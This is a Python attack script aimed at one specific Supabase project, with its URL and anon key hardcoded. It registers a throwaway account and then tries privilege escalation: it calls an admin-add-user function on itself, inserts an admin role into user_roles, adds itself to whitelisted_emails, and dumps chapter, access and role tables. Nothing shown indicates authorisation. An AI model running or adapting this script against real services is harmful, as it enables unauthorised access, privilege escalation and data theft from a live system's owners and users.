import urllib.request, urllib.error, ssl, json, time, base64

BASE="https://iuqrarlmvuydxhiygkro.supabase.co"
ANON="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml1cXJhcmxtdnV5ZHhoaXlna3JvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzAzODI2NzUsImV4cCI6MjA4NTk1ODY3NX0.DCWPItRMC2aekqWjFoTGoROzzmR_q2uy2NjJK-nAxLg"
ctx=ssl.create_default_context()

def req(method, path, body=None, token=None, prefer=None):
    url=f"{BASE}{path}"
    data=json.dumps(body).encode() if body is not None else None
    h={"apikey":ANON,"Authorization":f"Bearer {token or ANON}","Content-Type":"application/json","Accept":"application/json"}
    if prefer: h["Prefer"]=prefer
    r=urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        resp=urllib.request.urlopen(r,timeout=25,context=ctx)
        return resp.status, resp.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")
    except Exception as e:
        return "ERR", str(e)

email=f"hunter_{int(time.time())}@proton.me"
s,o=req("POST","/auth/v1/signup",{"email":email,"password":"L@ntern-2026!"})
j=json.loads(o); tok=j.get("access_token"); 
sub=json.loads(base64.urlsafe_b64decode(tok.split(".")[1]+"==")).get("sub")
print("signup:",s,"email:",email,"sub:",sub)

print("\n[A] admin-add-user with my session (whitelist myself):")
s,o=req("POST","/functions/v1/admin-add-user",{"email":email,"name":"hunter"},token=tok); print("  ",s,o[:400])

print("\n[B] insert user_roles admin:")
s,o=req("POST","/rest/v1/user_roles",{"user_id":sub,"role":"admin"},token=tok,prefer="return=representation"); print("  ",s,o[:400])

print("\n[C] insert whitelisted_emails:")
s,o=req("POST","/rest/v1/whitelisted_emails",{"email":email},token=tok,prefer="return=representation"); print("  ",s,o[:400])

print("\n--- re-read content after escalation attempts ---")
for t in ["chapters","chapter_content","chapter_access","whitelisted_emails","user_roles"]:
    s,o=req("GET",f"/rest/v1/{t}?select=*",token=tok)
    print(f"{t} -> {s} {o[:400]}")
